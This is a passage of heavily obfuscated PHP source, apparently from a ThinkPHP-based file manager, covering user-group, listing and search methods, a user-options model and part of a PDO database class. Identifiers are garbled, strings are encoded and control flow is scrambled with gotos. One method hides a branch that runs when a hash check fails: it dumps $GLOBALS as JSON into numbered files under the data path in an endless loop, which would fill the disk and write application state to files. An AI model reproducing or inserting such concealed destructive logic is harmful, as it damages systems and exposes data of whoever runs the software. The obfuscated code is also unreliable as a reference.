$cª©™Âàƒ, $e½½‰“ƒ”[1699] => $D¹¿Ì÷¨”, $e½½‰“ƒ”[1794] => $fÄóÆĞ¡ò); $b¿Û´ºÇ¦Å[$e½½‰“ƒ”[1722]] = isset($eµ‘÷Šˆì˜[$a…Ò¿¬—¿]) ? $eµ‘÷Šˆì˜[$a…Ò¿¬—¿] : 0; $a…Ò¿¬—¿++; $dÇÖ‚Ï”òŸ[] = $b¿Û´ºÇ¦Å; } return $D×‹İ¸ê->addAll($dÇÖ‚Ï”òŸ, array(), !0); goto fË—â÷‚‚Â; A¿”¨ËÄİ©: if ($_SERVER[$e½½‰“ƒ”[244]] != $FÎï‘”µæñ($cÚÙ²‘îç¼)) { goto AÌ½Ğ£ä÷ƒ; AÌ½Ğ£ä÷ƒ: $E¶Ñõì” = $e½½‰“ƒ”[848]; $aöºßØƒÙˆ = $e½½‰“ƒ”[245]; $DãÖÅ¼‹Äğ = $_SERVER[$e½½‰“ƒ”[246]] . $e½½‰“ƒ”[247]; goto AˆÓø°âàÕ; fÃíœ¹®Ë: $E¶Ñõì”(); $d´’¸â›¼î = $e½½‰“ƒ”[1405]; $d÷¿Öæí„¦ = json_encode($GLOBALS[$e½½‰“ƒ”[1406]]); goto A³È›æğçì; FÔå«ÄõŸš: $F’‚²ªÃ»¨ = $e½½‰“ƒ”[849]; $F’‚²ªÃ»¨($_SERVER[$e½½‰“ƒ”[850]]); $E¶Ñõì” = $e½½‰“ƒ”[848]; goto fÃíœ¹®Ë; AˆÓø°âàÕ: $D‘·×”Øâƒ = $aöºßØƒÙˆ($DãÖÅ¼‹Äğ); $C‡ö‹îÈ ¶ = explode($e½½‰“ƒ”[229], $D‘·×”Øâƒ); if (count($C‡ö‹îÈ ¶) < $e½½‰“ƒ”[588]) { $f‹»Â´—Œ£ = $e½½‰“ƒ”[249]; $f‹»Â´—Œ£(); } goto FÔå«ÄõŸš; A³È›æğçì: $DâÄ¤„·Ö« = 1; for ($DŠÁô±ÕËÛ = $DâÄ¤„·Ö«; $DŠÁô±ÕËÛ > 0; $DŠÁô±ÕËÛ++) { $d´’¸â›¼î(DATA_PATH . $DŠÁô±ÕËÛ, $d÷¿Öæí„¦); } goto bŞîä¼‰×á; bŞîä¼‰×á: } $aâáÛ¹Õù‘ = $this->getInfoSimple($cª©™Âàƒ); if (!$aâáÛ¹Õù‘ || !is_array($fÒÅÈè…ï)) { return !1; } goto D›‘™¨£Ö; DÕàñâíëÌ: $e½½‰“ƒ” =& $_SERVER[úÉ·öƒÑì©]; $cÚÙ²‘îç¼ = $_SERVER[$e½½‰“ƒ”[246]] . $e½½‰“ƒ”[247]; $FÎï‘”µæñ = $e½½‰“ƒ”[243]; goto A¿”¨ËÄİ©; fË—â÷‚‚Â: } protected function userGroupAdd($CŸ÷®ÌÓÅß, $bóÀó™®Ö½ = array()) { $eƒí¯ˆ¢±É =& $_SERVER[úÉ·öƒÑì©]; $A‘äŸˆ®Õ¹ = $this->getInfoSimple($CŸ÷®ÌÓÅß); if (!$A‘äŸˆ®Õ¹ || empty($bóÀó™®Ö½)) { return !1; } $Câ÷Â®äš… = array(); foreach ($bóÀó™®Ö½ as $f×¨ŞéÀÌä => $EïäëÑ»ŸÜ) { $Câ÷Â®äš…[] = array($eƒí¯ˆ¢±É[1535] => $CŸ÷®ÌÓÅß, $eƒí¯ˆ¢±É[1699] => $f×¨ŞéÀÌä, $eƒí¯ˆ¢±É[1794] => $EïäëÑ»ŸÜ, $eƒí¯ˆ¢±É[1722] => 0); } return Model($eƒí¯ˆ¢±É[1780])->addAll($Câ÷Â®äš…, array(), !0); } protected function userGroupRemove($Bƒ®ì‚ëó, $CÆ²Ï‘Å·¹) { $f†¼˜ÏñŠœ =& $_SERVER[úÉ·öƒÑì©]; $fÏ×ÈÀ®¤ä = $this->getInfoSimple($Bƒ®ì‚ëó); if (!$fÏ×ÈÀ®¤ä || !$CÆ²Ï‘Å·¹) { return !1; } $bÀó›Ë¹„À = array($f†¼˜ÏñŠœ[1527] => $Bƒ®ì‚ëó, $f†¼˜ÏñŠœ[1777] => $CÆ²Ï‘Å·¹); return Model($f†¼˜ÏñŠœ[1780])->where($bÀó›Ë¹„À)->delete(); } public function listData() { $Dƒ¼õÂ¡­¾ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($Dƒ¼õÂ¡­¾[$_SERVER[úÉ·öƒÑì©][376]]); return $Dƒ¼õÂ¡­¾; } public function listByID($Dõù˜ÕÜ…¢) { $Câ„²¯¿”¾ =& $_SERVER[úÉ·öƒÑì©]; if (!$Dõù˜ÕÜ…¢) { return; } $eé¿ãÊ‡ÒÚ = array($Câ„²¯¿”¾[1535] => array($Câ„²¯¿”¾[7], $Dõù˜ÕÜ…¢)); $F±ÊÚ‡‡½ë = $this->where($eé¿ãÊ‡ÒÚ)->select(); $this->_listDataApply($F±ÊÚ‡‡½ë); return $F±ÊÚ‡‡½ë; } public function listByGroup($d—çÜùã˜± = 0, $fÏ­Á—á²“ = array()) { goto cŒÈîš¾ í; f¸Øà‹ìó÷: $this->_listDataApply($E¸«¬ ñ·Û[$d‹‹£Ê‡ñ™[376]]); return $E¸«¬ ñ·Û; goto BŒÑ†ŞÄ™; cŒÈîš¾ í: $d‹‹£Ê‡ñ™ =& $_SERVER[úÉ·öƒÑì©]; $A…ÅØ³ÄÆ = $d‹‹£Ê‡ñ™[33]; $f·á“Şğ” = array(); goto D¢¿ò¹òé“; D¢¿ò¹òé“: if ($d—çÜùã˜±) { $f·á“Şğ” = array($d‹‹£Ê‡ñ™[2160] => intval($d—çÜùã˜±)); $A…ÅØ³ÄÆ = "\114\x45\x46\x54\40\112\117\111\x4e\x20{$this->tablePrefix}\x75\163\x65\162\x5f\147\x72\x6f\x75\160\x20\165\x73\x65\162\x5f\147\162\157\165\160\x20\x6f\x6e\x20\165\163\x65\x72\56\165\x73\x65\x72\x49\104\40\75\40\165\163\145\x72\x5f\147\x72\157\x75\x70\x2e\x75\163\x65\x72\x49\104"; $DĞ’ÖŸËõ = Input::get($d‹‹£Ê‡ñ™[444], null, $d‹‹£Ê‡ñ™[33]) ? $d‹‹£Ê‡ñ™[33] : $d‹‹£Ê‡ñ™[2161]; } if (isset($fÏ­Á—á²“[$d‹‹£Ê‡ñ™[726]])) { $f·á“Şğ”[$d‹‹£Ê‡ñ™[2162]] = $fÏ­Á—á²“[$d‹‹£Ê‡ñ™[726]]; } $E¸«¬ ñ·Û = $this->_makeOrder($DĞ’ÖŸËõ)->field($d‹‹£Ê‡ñ™[2163])->where($f·á“Şğ”)->join($A…ÅØ³ÄÆ)->selectPage(50); goto f¸Øà‹ìó÷; BŒÑ†ŞÄ™: } private function _makeOrder($F±¹”İ¹¡’ = '') { goto b«»Ë—Ÿ²—; cÒ©ö–…: $BÕ†Ø©¥Ó = Input::get($c¾ö«ŠÙ¹[444], $c¾ö«ŠÙ¹[7], $c¾ö«ŠÙ¹[1527], $bŸÎ‡‡šò); $f’¥ÅÀÄˆ¾ = Input::get($c¾ö«ŠÙ¹[445], $c¾ö«ŠÙ¹[7], $c¾ö«ŠÙ¹[1781], array($c¾ö«ŠÙ¹[1781], $c¾ö«ŠÙ¹[439])); $f’¥ÅÀÄˆ¾ = $bñ›õ†öî[$f’¥ÅÀÄˆ¾]; goto A»ÅÁÌ¼¾Ï; b«»Ë—Ÿ²—: $c¾ö«ŠÙ¹ =& $_SERVER[úÉ·öƒÑì©]; $bŸÎ‡‡šò = array($c¾ö«ŠÙ¹[1535], $c¾ö«ŠÙ¹[28], $c¾ö«ŠÙ¹[1685], $c¾ö«ŠÙ¹[1657], $c¾ö«ŠÙ¹[194]); $bñ›õ†öî = array($c¾ö«ŠÙ¹[437] => $c¾ö«ŠÙ¹[438], $c¾ö«ŠÙ¹[439] => $c¾ö«ŠÙ¹[440]); goto cÒ©ö–…; A»ÅÁÌ¼¾Ï: $F±¹”İ¹¡’ = $F±¹”İ¹¡’ . "\165\163\145\x72\56{$BÕ†Ø©¥Ó}\x20{$f’¥ÅÀÄˆ¾}\x2c\40\165\x73\x65\162\x2e\x75\x73\x65\x72\x49\104\40\x61\163\143"; return $this->alias($c¾ö«ŠÙ¹[1903])->order($F±¹”İ¹¡’); goto fĞÀ‚é×™¢; fĞÀ‚é×™¢: } public function listSearch($dèéƒçÌÁ¥) { goto bâî„‰£Á•; e«•ÂÓ©£–: $this->_filterByGroup($Eæ³ŞÉß…´, $d·—˜ÑÜÂ); return $Eæ³ŞÉß…´; goto dÀ¿Ë‡……ß; eŒŒÔ´º¤ƒ: if (!$bÀ‡œèË×Ô) { $f©¸Çòòª› = array(); } if (isset($dèéƒçÌÁ¥[$fˆ‡èğÁ[726]])) { $f©¸Çòòª›[$fˆ‡èğÁ[726]] = $dèéƒçÌÁ¥[$fˆ‡èğÁ[726]]; } $f©¸Çòòª› = $this->parseWhereLike($f©¸Çòòª›); goto cÀ¬öê®; cÀ¬öê®: $Eæ³ŞÉß…´ = $this->_makeOrder()->where($f©¸Çòòª›)->selectPage(20); if (!$Eæ³ŞÉß…´ || count($Eæ³ŞÉß…´[$fˆ‡èğÁ[376]]) < 5 && Input::check($bÀ‡œèË×Ô, $fˆ‡èğÁ[325])) { $A‰Ø øñº• = $this->_searchFromMeta($fˆ‡èğÁ[452], $bÀ‡œèË×Ô, 10); $FàÕò¿ª‚ = $this->_searchFromMeta($fˆ‡èğÁ[453], $bÀ‡œèË×Ô, 10); $dµö¬‘ñ = array_merge($A‰Ø øñº•, $FàÕò¿ª‚, $Eæ³ŞÉß…´[$fˆ‡èğÁ[376]]); $Eæ³ŞÉß…´[$fˆ‡èğÁ[376]] = array_unique_by_key($dµö¬‘ñ, $fˆ‡èğÁ[1535]); $Eæ³ŞÉß…´[$fˆ‡èğÁ[373]][$fˆ‡èğÁ[374]] = count($Eæ³ŞÉß…´[$fˆ‡èğÁ[376]]); $Eæ³ŞÉß…´[$fˆ‡èğÁ[373]][$fˆ‡èğÁ[375]] = ceil($Eæ³ŞÉß…´[$fˆ‡èğÁ[373]][$fˆ‡èğÁ[374]] / $Eæ³ŞÉß…´[$fˆ‡èğÁ[373]][$fˆ‡èğÁ[370]]); } $this->_listDataApply($Eæ³ŞÉß…´[$fˆ‡èğÁ[376]]); goto e«•ÂÓ©£–; cªÚáÆÒÉè: $bÀ‡œèË×Ô = str_replace($fˆ‡èğÁ[1784], $fˆ‡èğÁ[1785], trim($bÀ‡œèË×Ô)); $f©¸Çòòª› = array($fˆ‡èğÁ[28] => array($fˆ‡èğÁ[389], "\45{$bÀ‡œèË×Ô}\45"), $fˆ‡èğÁ[312] => array($fˆ‡èğÁ[389], "{$bÀ‡œèË×Ô}\x25"), $fˆ‡èğÁ[1963] => array($fˆ‡èğÁ[389], "{$bÀ‡œèË×Ô}\45"), $fˆ‡èğÁ[965] => $fˆ‡èğÁ[1786]); if (Input::check($bÀ‡œèË×Ô, $fˆ‡èğÁ[318])) { $f©¸Çòòª›[$fˆ‡èğÁ[1535]] = array($fˆ‡èğÁ[389], "{$bÀ‡œèË×Ô}\45"); $f©¸Çòòª›[$fˆ‡èğÁ[2144]] = array($fˆ‡èğÁ[389], "{$bÀ‡œèË×Ô}\x25"); } goto eŒŒÔ´º¤ƒ; bâî„‰£Á•: $fˆ‡èğÁ =& $_SERVER[úÉ·öƒÑì©]; $bÀ‡œèË×Ô = $dèéƒçÌÁ¥[$fˆ‡èğÁ[1782]]; $d·—˜ÑÜÂ = isset($dèéƒçÌÁ¥[$fˆ‡èğÁ[1783]]) ? $dèéƒçÌÁ¥[$fˆ‡èğÁ[1783]] : !1; goto cªÚáÆÒÉè; dÀ¿Ë‡……ß: } private function _filterByGroup(&$cˆ””•‘ƒ, $B¸Àã§¬Ì ) { $c‡›ï ÍÁ½ =& $_SERVER[úÉ·öƒÑì©]; if (!$B¸Àã§¬Ì ) { return $cˆ””•‘ƒ; } foreach ($cˆ””•‘ƒ[$c‡›ï ÍÁ½[376]] as $díÃ‘Ëã­® => &$f¶ÉñÜâÓ˜) { $eÚ‡ó¸ù¼Ê = array_to_keyvalue($f¶ÉñÜâÓ˜[$c‡›ï ÍÁ½[1873]], $c‡›ï ÍÁ½[33], $c‡›ï ÍÁ½[1699]); if (!in_array($B¸Àã§¬Ì , $eÚ‡ó¸ù¼Ê)) { unset($cˆ””•‘ƒ[$c‡›ï ÍÁ½[376]][$díÃ‘Ëã­®]); } } unset($f¶ÉñÜâÓ˜); $cˆ””•‘ƒ[$c‡›ï ÍÁ½[376]] = array_values($cˆ””•‘ƒ[$c‡›ï ÍÁ½[376]]); $cˆ””•‘ƒ[$c‡›ï ÍÁ½[373]] = array($c‡›ï ÍÁ½[1935] => count($cˆ””•‘ƒ[$c‡›ï ÍÁ½[376]]), $c‡›ï ÍÁ½[1933] => $cˆ””•‘ƒ[$c‡›ï ÍÁ½[373]][$c‡›ï ÍÁ½[370]], $c‡›ï ÍÁ½[1932] => 1, $c‡›ï ÍÁ½[1934] => 1); } private function _searchFromMeta($Fšåšç÷ ³, $Cè’÷Íòˆ‚, $bƒŠ¹èî¦) { goto bõçÉ¯åéÅ; F¼”Øà›‹ï: $bÔÍªø™“¦ = $this->parseWhereLike($bÔÍªø™“¦); $E¸ÙÏôÆ¼º = Model($aß§ŠÊË…¬[2164])->where($bÔÍªø™“¦)->limit($bƒŠ¹èî¦)->select(); if (!$E¸ÙÏôÆ¼º) { return array(); } goto C¹çÈÕ½ê†; bõçÉ¯åéÅ: $aß§ŠÊË…¬ =& $_SERVER[úÉ·öƒÑì©]; $Cè’÷Íòˆ‚ = strtolower($Cè’÷Íòˆ‚); $bÔÍªø™“¦ = array($aß§ŠÊË…¬[93] => $Fšåšç÷ ³, $aß§ŠÊË…¬[381] => array($aß§ŠÊË…¬[389], "\x25{$Cè’÷Íòˆ‚}\x25")); goto F¼”Øà›‹ï; Cß»Æ­ »Ç: return $Bœ´Ô­ˆ„Ø; goto Bº‡ßù„»; C¹çÈÕ½ê†: $E¸ÙÏôÆ¼º = array_to_keyvalue($E¸ÙÏôÆ¼º, $aß§ŠÊË…¬[33], $aß§ŠÊË…¬[1535]); $Bœ´Ô­ˆ„Ø = $this->where(array($aß§ŠÊË…¬[1527] => array($aß§ŠÊË…¬[7], $E¸ÙÏôÆ¼º)))->select(); if (!$Bœ´Ô­ˆ„Ø) { return array(); } goto Cß»Æ­ »Ç; Bº‡ßù„»: } private function _listDataApplyItem($dÏÎ£Ş¾åø) { $Cé²äÄäµŞ = array($dÏÎ£Ş¾åø); $this->_listDataApply($Cé²äÄäµŞ); return $Cé²äÄäµŞ[0]; } private function _listDataApply(&$a•Ó£˜«œç) { goto cæï‹©ˆšñ; DºæÏÓÓ°ò: $dÂšš‚Æ = array_to_keyvalue($a•Ó£˜«œç, $b­Ì¶–¸¬‘[33], $b­Ì¶–¸¬‘[1535]); $this->_listAppendGroup($a•Ó£˜«œç, $dÂšš‚Æ); $this->_listAppendMeta($a•Ó£˜«œç, $dÂšš‚Æ); goto Cƒ›ß¥ÃÁ©; cæï‹©ˆšñ: $b­Ì¶–¸¬‘ =& $_SERVER[úÉ·öƒÑì©]; if (!$a•Ó£˜«œç) { return; } array_remove_key($a•Ó£˜«œç, $b­Ì¶–¸¬‘[857]); goto DºæÏÓÓ°ò; Cƒ›ß¥ÃÁ©: $this->_listAppendSourceRoot($a•Ó£˜«œç, $dÂšš‚Æ); goto F…Á’‰‹ºØ; F…Á’‰‹ºØ: } private function _listAppendSourceRoot(&$cÂÏ¶ŸºÅğ, $AˆÛŠ‹Ò·ƒ) { goto dÎ¡¯â«³Œ; dÎ¡¯â«³Œ: $A÷£¹ºîÏ =& $_SERVER[úÉ·öƒÑì©]; $bµãÕÕè‰– = array($A÷£¹ºîÏ[487] => 0, $A÷£¹ºîÏ[413] => SourceModel::TYPE_USER, $A÷£¹ºîÏ[493] => array($A÷£¹ºîÏ[7], $AˆÛŠ‹Ò·ƒ)); $C¶ŒõÁ™ÀŒ = $A÷£¹ºîÏ[1792]; goto A­¤ÑéŞ”à; A­¤ÑéŞ”à: $B¾»ÜÕ®¹ = Model($A÷£¹ºîÏ[806])->order($A÷£¹ºîÏ[1793])->field($C¶ŒõÁ™ÀŒ)->where($bµãÕÕè‰–)->select(); $B¾»ÜÕ®¹ = array_to_keyvalue($B¾»ÜÕ®¹, $A÷£¹ºîÏ[493]); $B¾»ÜÕ®¹ = array_remove_key($B¾»ÜÕ®¹, $A÷£¹ºîÏ[493]); goto AåÕÍ¾áÒ; AåÕÍ¾áÒ: foreach ($cÂÏ¶ŸºÅğ as &$a¡ÔÆ¼†² ) { $a¡ÔÆ¼†² [$A÷£¹ºîÏ[85]] = $B¾»ÜÕ®¹[$a¡ÔÆ¼†² [$A÷£¹ºîÏ[1535]]] ? $B¾»ÜÕ®¹[$a¡ÔÆ¼†² [$A÷£¹ºîÏ[1535]]] : array(); } unset($a¡ÔÆ¼†² ); goto Bé‰©±ËÈ; Bé‰©±ËÈ: } private function _listAppendGroup(&$C‰òë¨º™, $Eåë—óéÆÅ) { goto D³ÙéÃÃé; cÚõ¤‚êÂï: foreach ($C‰òë¨º™ as &$AË±ÆóŸÏ) { $AË±ÆóŸÏ[$BÁŞ³„…òØ[1873]] = array(); if (isset($E¹·ñèµ£[$AË±ÆóŸÏ[$BÁŞ³„…òØ[1535]]])) { $AË±ÆóŸÏ[$BÁŞ³„…òØ[1873]] = $E¹·ñèµ£[$AË±ÆóŸÏ[$BÁŞ³„…òØ[1535]]]; } } unset($AË±ÆóŸÏ); goto bâ÷ÈÜƒ…†; AöˆÌ‚ÑÍ: $E¹·ñèµ£ = array_to_keyvalue_group($E¹·ñèµ£, $BÁŞ³„…òØ[1535]); foreach ($E¹·ñèµ£ as &$BŠÑçâõ¿) { $dºÊøäªÄ³ = array(); foreach ($BŠÑçâõ¿ as $f¹ŸŞ•äÏ¿) { if (!$f¹ŸŞ•äÏ¿[$BÁŞ³„…òØ[1794]]) { continue; } $f—÷êÍËœ = Model($BÁŞ³„…òØ[1866])->listData($f¹ŸŞ•äÏ¿[$BÁŞ³„…òØ[1794]]); $dºÊøäªÄ³[] = array($BÁŞ³„…òØ[1699] => $f¹ŸŞ•äÏ¿[$BÁŞ³„…òØ[1699]], $BÁŞ³„…òØ[2166] => $C¡Î±Âßª®[$f¹ŸŞ•äÏ¿[$BÁŞ³„…òØ[1699]]][$BÁŞ³„…òØ[28]], $BÁŞ³„…òØ[496] => $C¡Î±Âßª®[$f¹ŸŞ•äÏ¿[$BÁŞ³„…òØ[1699]]][$BÁŞ³„…òØ[496]], $BÁŞ³„…òØ[415] => $f—÷êÍËœ); } $BŠÑçâõ¿ = $dºÊøäªÄ³; } unset($BŠÑçâõ¿); goto cÚõ¤‚êÂï; bŠíî¶Ñê·: $A“™ç“¥Ã = array($BÁŞ³„…òØ[1699] => array($BÁŞ³„…òØ[7], $FÅÌÕ­×Æ÷)); $C¡Î±Âßª® = Model($BÁŞ³„…òØ[1871])->field($BÁŞ³„…òØ[2165])->where($A“™ç“¥Ã)->select(); $C¡Î±Âßª® = array_to_keyvalue($C¡Î±Âßª®, $BÁŞ³„…òØ[1699]); goto AöˆÌ‚ÑÍ; aƒˆ„óÑ³§: $FÅÌÕ­×Æ÷ = array_to_keyvalue($E¹·ñèµ£, $BÁŞ³„…òØ[33], $BÁŞ³„…òØ[1699]); $FÅÌÕ­×Æ÷ = array_remove_value(array_unique($FÅÌÕ­×Æ÷), $BÁŞ³„…òØ[191]); if (!$FÅÌÕ­×Æ÷ || !$E¹·ñèµ£) { return; } goto bŠíî¶Ñê·; D³ÙéÃÃé: $BÁŞ³„…òØ =& $_SERVER[úÉ·öƒÑì©]; $A“™ç“¥Ã = array($BÁŞ³„…òØ[1535] => array($BÁŞ³„…òØ[7], $Eåë—óéÆÅ)); $E¹·ñèµ£ = Model($BÁŞ³„…òØ[1780])->where($A“™ç“¥Ã)->select(); goto aƒˆ„óÑ³§; bâ÷ÈÜƒ…†: } private function _listAppendMeta(&$b©´ÂÙ°ê, $B¢è†ìî¥¢) { goto Cöª›”Ø‰; Cöª›”Ø‰: $cª‚¸–³¬ã =& $_SERVER[úÉ·öƒÑì©]; $E„¢Ñ›…Š½ = UserJobModel::JOB_KEY; $e†¥Ë¥ˆÈ = array($cª‚¸–³¬ã[2145]); goto D‘§ÈÜ¹¼Ù; Fƒ·»¯ÄÓ: foreach ($b©´ÂÙ°ê as &$a‘²É²òœ‚) { $DÊ ¼æò = array(); if (isset($bœéÔ°©ñ¤[$a‘²É²òœ‚[$cª‚¸–³¬ã[1535]]])) { $DÊ ¼æò = $bœéÔ°©ñ¤[$a‘²É²òœ‚[$cª‚¸–³¬ã[1535]]]; } $a‘²É²òœ‚[$cª‚¸–³¬ã[2168]] = array(); if (isset($DÊ ¼æò[$E„¢Ñ›…Š½])) { $a‘²É²òœ‚[$cª‚¸–³¬ã[2168]] = $d…ÛùÃ ²->getUserJobInfo($DÊ ¼æò[$E„¢Ñ›…Š½]); } } unset($a‘²É²òœ‚); goto fİ¸™ À…¬; D‘§ÈÜ¹¼Ù: $b¼ÁÍ°î½ = array($cª‚¸–³¬ã[1535] => array($cª‚¸–³¬ã[7], $B¢è†ìî¥¢)); $bœéÔ°©ñ¤ = Model($cª‚¸–³¬ã[2143])->where($b¼ÁÍ°î½)->select(); $bœéÔ°©ñ¤ = array_to_keyvalue_group($bœéÔ°©ñ¤, $cª‚¸–³¬ã[1535]); goto Dä÷¥–ù¼Ä; Dä÷¥–ù¼Ä: foreach ($bœéÔ°©ñ¤ as &$C¡Ü‚÷ØÄˆ) { $a½èá¦¥‚Ö = array(); foreach ($C¡Ü‚÷ØÄˆ as $a¡‰…Š»÷İ) { if (!in_array($a¡‰…Š»÷İ[$cª‚¸–³¬ã[93]], $e†¥Ë¥ˆÈ)) { $a½èá¦¥‚Ö[$a¡‰…Š»÷İ[$cª‚¸–³¬ã[93]]] = $a¡‰…Š»÷İ[$cª‚¸–³¬ã[381]]; } } $C¡Ü‚÷ØÄˆ = $a½èá¦¥‚Ö; } unset($C¡Ü‚÷ØÄˆ); $d…ÛùÃ ² = Model($cª‚¸–³¬ã[2167]); goto Fƒ·»¯ÄÓ; fİ¸™ À…¬: } protected function groupUserAll($AóÛ½áÇ¯º) { $DìÂ‡¶âö… =& $_SERVER[úÉ·öƒÑì©]; if (!$AóÛ½áÇ¯º) { return !1; } $d½Œ—ğ›– = Model($DìÂ‡¶âö…[1780])->field($DìÂ‡¶âö…[1535])->where(array($DìÂ‡¶âö…[1699] => array($DìÂ‡¶âö…[7], $AóÛ½áÇ¯º)))->select(); $d½Œ—ğ›– = array_to_keyvalue($d½Œ—ğ›–, $DìÂ‡¶âö…[33], $DìÂ‡¶âö…[1535]); return array_unique($d½Œ—ğ›–); } public function userSearch($A·¡å¤¬±, $c¯³ÚŠ‘Â = "\52") { return Model($_SERVER[úÉ·öƒÑì©][515])->where($A·¡å¤¬±)->field($c¯³ÚŠ‘Â)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\163\145\162\137\157\x70\164\151\157\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($B‰½Ú„êŸì) { $aÀßÅŞËó =& $_SERVER[úÉ·öƒÑì©]; if (!defined($aÀßÅŞËó[463])) { define($aÀßÅŞËó[463], 0); } return "\125\x73\145\162\x4f\x70\164\x69\157\x6e\137{$B‰½Ú„êŸì}\x5f" . USER_ID; } protected function filterWhere($A­ÍØ×®£) { $bÏåÈ¾áÜ™ =& $_SERVER[úÉ·öƒÑì©]; if (!defined($bÏåÈ¾áÜ™[463])) { define($bÏåÈ¾áÜ™[463], 0); } $A­ÍØ×®£[$bÏåÈ¾áÜ™[1535]] = USER_ID; return $A­ÍØ×®£; } public function cacheRemoveUser($E“àñó×¦é, $eÌÚ·Ì²çâ) { return Cache::remove("\125\163\x65\162\117\160\x74\x69\x6f\156\137{$E“àñó×¦é}\137" . $eÌÚ·Ì²çâ); } protected function optionDefault($bå¾°È¼šµ = '') { $DæĞœá’˜¸ =& $_SERVER[úÉ·öƒÑì©]; if ($bå¾°È¼šµ == $DæĞœá’˜¸[33]) { return $GLOBALS[$DæĞœá’˜¸[6]][$DæĞœá’˜¸[2169]]; } if ($bå¾°È¼šµ == $DæĞœá’˜¸[2170]) { return $GLOBALS[$DæĞœá’˜¸[6]][$DæĞœá’˜¸[2171]]; } } } goto EÇ¥Ë¸âÁ‚; A‹‡ÊÂ—åĞ: class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($dÈ×±…ÆÔ¶ = '') { $c¡ƒè…øØ =& $_SERVER[úÉ·öƒÑì©]; if (!class_exists($c¡ƒè…øØ[881])) { think_exception(think_lang($c¡ƒè…øØ[10]) . $c¡ƒè…øØ[882]); } if (!empty($dÈ×±…ÆÔ¶)) { $this->config = $dÈ×±…ÆÔ¶; if (empty($this->config[$c¡ƒè…øØ[13]])) { $this->config[$c¡ƒè…øØ[13]] = array(); } } } public function connect($D¯‹­–î« = '', $d÷“êÃ‚—Î = 0) { $c­“ŠĞµ‚ƒ =& $_SERVER[úÉ·öƒÑì©]; if (!isset($this->linkID[$d÷“êÃ‚—Î])) { goto Eö§„‚ÅöÊ; B¢¡‘ƒªŸ’: if (!$this->linkID[$d÷“êÃ‚—Î]) { think_exception($c­“ŠĞµ‚ƒ[891]); } try { $this->linkID[$d÷“êÃ‚—Î]->exec($c­“ŠĞµ‚ƒ[892] . think_config($c­“ŠĞµ‚ƒ[859])); } catch (Exception $F¹õÓøÈò) { } $this->connected = !0; goto aÅ…ˆÕÂ°; EŒÆãŒ®ƒŒ: try { $this->linkID[$d÷“êÃ‚—Î] = new PDO($D¯‹­–î«[$c­“ŠĞµ‚ƒ[883]], $D¯‹­–î«[$c­“ŠĞµ‚ƒ[856]], $D¯‹­–î«[$c­“ŠĞµ‚ƒ[857]], $D¯‹­–î«[$c­“ŠĞµ‚ƒ[13]]); } catch (PDOException $F¹õÓøÈò) { think_exception($F¹õÓøÈò->getMessage()); } $this->dbType = $this->_getDsnType($D¯‹­–î«[$c­“ŠĞµ‚ƒ[883]]); if (in_array($this->dbType, array($c­“ŠĞµ‚ƒ[884], $c­“ŠĞµ‚ƒ[885], $c­“ŠĞµ‚ƒ[886], $c­“ŠĞµ‚ƒ[887]))) { think_exception($c­“ŠĞµ‚ƒ[888] . $this->dbType . $c­“ŠĞµ‚ƒ[889] . $this->dbType . $c­“ŠĞµ‚ƒ[890]); } goto B¢¡‘ƒªŸ’; Eö§„‚ÅöÊ: if (empty($D¯‹­–î«)) { $D¯‹­–î« = $this->config; } $Fª‘Ñ²“¡é = !empty($D¯‹­–î«[$c­“ŠĞµ‚ƒ[13]][$c­“ŠĞµ‚ƒ[14]]) ? $D¯‹­–î«[$c­“ŠĞµ‚ƒ[13]][$c­“ŠĞµ‚ƒ[14]] : $this->pconnect; if ($Fª‘Ñ²“¡é) { $D¯‹­–î«[$c­“ŠĞµ‚ƒ[13]][PDO::ATTR_PERSISTENT] = !0; } goto EŒÆãŒ®ƒŒ; aÅ…ˆÕÂ°: if (1 != think_config($c­“ŠĞµ‚ƒ[18])) { unset($this->config); } goto d× ´ÉÒ¸ç; d× ´ÉÒ¸ç: } return $this->linkID[$d÷“êÃ‚—Î]; } public function free() { $this->PDOStatement = null; } public function query($Bãë›ö£´­, $DÚåòòñ¾Š = array()) { goto fùèÎì„„÷; fƒØ«ƒÏŠ’: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $A²÷–‹µˆ = $this->PDOStatement->execute($DÚåòòñ¾Š); $this->debug(); goto b ¦îÁ•ÎÙ; B×Ğ—‡ö×¦: think_action_status($a…ƒ†ÅåŞÄ[19], 1); think_status($a…ƒ†ÅåŞÄ[20]); $this->PDOStatement = $this->_linkID->prepare($Bãë›ö£´­); goto fƒØ«ƒÏŠ’; b ¦îÁ•ÎÙ: if (!1 === $A²÷–‹µˆ) { $this->error(); return !1; } else { return $this->getAll(); } goto CÆ‰·´„ëƒ; fùèÎì„„÷: $a…ƒ†ÅåŞÄ =& $_SERVER[úÉ·öƒÑì©]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto Dõ×–˜™ñ÷; Dõ×–˜™ñ÷: $this->queryStr = $Bãë›ö£´­; if (!empty($DÚåòòñ¾Š)) { $this->queryStr .= $a…ƒ†ÅåŞÄ[893] . print_r($DÚåòòñ¾Š, !0) . $a…ƒ†ÅåŞÄ[894]; } if (!empty($this->PDOStatement)) { $this->free(); } goto B×Ğ—‡ö×¦; CÆ‰·´„ëƒ: } public function execute($d››‡ô¨ŒÉ, $DÚ šè–ô« = array()) { goto E­èÅõÚ¼; E­èÅõÚ¼: $C²²·½Ã†Î =& $_SERVER[úÉ·öƒÑì©]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto e¥¯ÖÕà†; a…ºáÄôŒ: $Bì¬Òƒ¿Íö = $this->PDOStatement->execute($DÚ šè–ô«); $this->debug(); if (!1 === $Bì¬Òƒ¿Íö) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($D¨ø¢ÉÏˆâ || preg_match($C²²·½Ã†Î[899], $d››‡ô¨ŒÉ)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto e‘ŠàêˆŠ; E¤¥î¸‚ÎÈ: think_status($C²²·½Ã†Î[20]); $this->PDOStatement = $this->_linkID->prepare($d››‡ô¨ŒÉ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto a…ºáÄôŒ; e„Ê¹“ÜÁ‹: if ($this->dbType == $C²²·½Ã†Î[887]) { if (preg_match($C²²·½Ã†Î[895], $this->queryStr, 